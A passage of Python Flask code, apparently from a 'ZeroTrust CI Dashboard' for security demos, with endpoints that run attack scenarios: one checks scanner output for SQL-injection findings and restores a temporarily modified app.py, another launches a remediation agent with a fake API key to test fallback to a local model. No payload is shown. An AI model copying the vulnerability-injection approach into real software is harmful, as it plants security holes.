            findings = data.get("results", [])
            sqli_det = any("injection" in str(f).lower() or "sql" in str(f).lower()
                           for f in findings)
            print(f"[Attack SQLi] ✓ {len(findings)} finding(s), sqli={sqli_det}")
            return jsonify({
                "success":      True,
                "findings":     len(findings),
                "sqli_detected": sqli_det
            })
        except Exception as e:
            print(f"[Attack SQLi] Erreur parsing : {e}")
            return jsonify({"success": False, "error": result.stderr[:300] or str(e)})

    finally:
        with open(app_path, "w", encoding="utf-8") as f:
            f.write(original)
        print("[Attack SQLi] app.py restauré")


@app.route("/api/attack/fallback", methods=["POST"])
def api_attack_fallback():
    """Scénario 4 — Lance l'agent avec une fausse clé API pour forcer le fallback Ollama."""
    agent_script = os.path.join(AGENT_DIR, "remediation_agent.py")
    print(f"[Attack Fallback] Agent : {agent_script}")

    if not os.path.isfile(agent_script):
        return jsonify({
            "success": True,
            "message": "[DEMO] remediation_agent.py non trouvé — simulation visuelle du fallback activée"
        })

    def run_fallback_test():
        env = os.environ.copy()
        env["ANTHROPIC_API_KEY"] = "sk-ant-invalid-key-for-fallback-test"
        python_cmd = shutil.which("python3") or shutil.which("python") or "python"
        result = subprocess.run(
            [python_cmd, agent_script],
            env=env, capture_output=True, text=True,
            timeout=120, cwd=BASE_DIR
        )
        print(f"[Attack Fallback] stdout: {result.stdout[:200]}")
        print(f"[Attack Fallback] stderr: {result.stderr[:200]}")

    thread = threading.Thread(target=run_fallback_test, daemon=True)
    thread.start()
    return jsonify({
        "success": True,
        "message": "Test fallback lancé — l'agent tente Claude avec clé invalide puis bascule sur Ollama"
    })


# ── Main ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("\n" + "=" * 60)
    print("  ZeroTrust CI Dashboard")
    print(f"  http://localhost:8888")
    print(f"  Jenkins  : {JENKINS_URL}/job/{JENKINS_JOB}")
    print(f"  Auth     : {'✓ Token ' + JENKINS_TOKEN[:6] + '…' if JENKINS_TOKEN else '✗ Token manquant'}")
    print(f"  Reports  : {REPORTS_DIR}")
    print(f"  TestApp  : {TESTAPP_DIR}")
    print(f"  Sync     : http://localhost:8888/api/sync-reports")
    print(f"  Debug    : http://localhost:8888/api/debug")
    print(f"  Stages   : http://localhost:8888/api/debug/stages")
    print(f"  Attaques : /api/attack/cve | /antitamper | /sqli | /fallback")
    print("=" * 60 + "\n")
    app.run(host="0.0.0.0", port=8888, debug=False)